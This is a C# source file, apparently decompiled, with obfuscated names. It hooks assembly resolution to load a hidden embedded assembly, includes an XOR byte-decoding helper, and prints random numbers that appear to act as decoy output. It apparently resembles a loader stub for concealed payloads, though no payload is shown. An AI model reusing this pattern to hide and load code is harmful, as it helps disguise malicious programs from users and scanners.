using System;
using System.Reflection;
using System.Threading;
using mono;

namespace ns0;

internal sealed class Class5
{
	internal static readonly AppDomain appDomain_0;

	internal static ManualResetEvent manualResetEvent_0;

	static Class5()
	{
		appDomain_0 = AppDomain.CurrentDomain;
		manualResetEvent_0 = new ManualResetEvent(initialState: false);
		smethod_0(appDomain_0);
		manualResetEvent_0.WaitOne(10000);
		Random random = new Random();
		int[] array = new int[10];
		int num = 0;
		int num2 = 0;
		while (num2 < 10)
		{
			int num3 = (array[num2] = random.Next(10));
			num2++;
			num += num3;
		}
		appDomain_0.AssemblyResolve += smethod_2;
		Console.WriteLine(string.Join(",", array));
		Console.WriteLine(" {0}", num);
		smethod_0(appDomain_0);
		smethod_1(appDomain_0);
	}

	private static void smethod_0(AppDomain appDomain_1)
	{
	}

	private static void smethod_1(AppDomain appDomain_1)
	{
		try
		{
			string fullName = Assembly.GetAssembly(null)!.FullName;
			appDomain_1.CreateInstance(fullName, "");
		}
		catch (Exception ex)
		{
			Console.WriteLine();
			Console.WriteLine(ex.Message);
		}
	}

	private static Assembly smethod_2(object object_0, ResolveEventArgs resolveEventArgs_0)
	{
		if (resolveEventArgs_0.Name.Contains(new string(Class0.char_0)))
		{
			return Class4.smethod_0();
		}
		return null;
	}

	[STAThread]
	public static void Main()
	{
		Random random = new Random();
		int[] array = new int[10];
		int num = 0;
		int num2 = 0;
		while (num2 < 10)
		{
			int num3 = (array[num2] = random.Next(10));
			num2++;
			num += num3;
		}
		Program.Main();
		Console.WriteLine(string.Join(",", array));
		Console.WriteLine(" {0}", num);
	}

	internal static byte smethod_3(byte[] byte_0, byte[] byte_1, int int_0)
	{
		return (byte)(byte_0[int_0] ^ byte_1[int_0 % byte_1.Length]);
	}
}
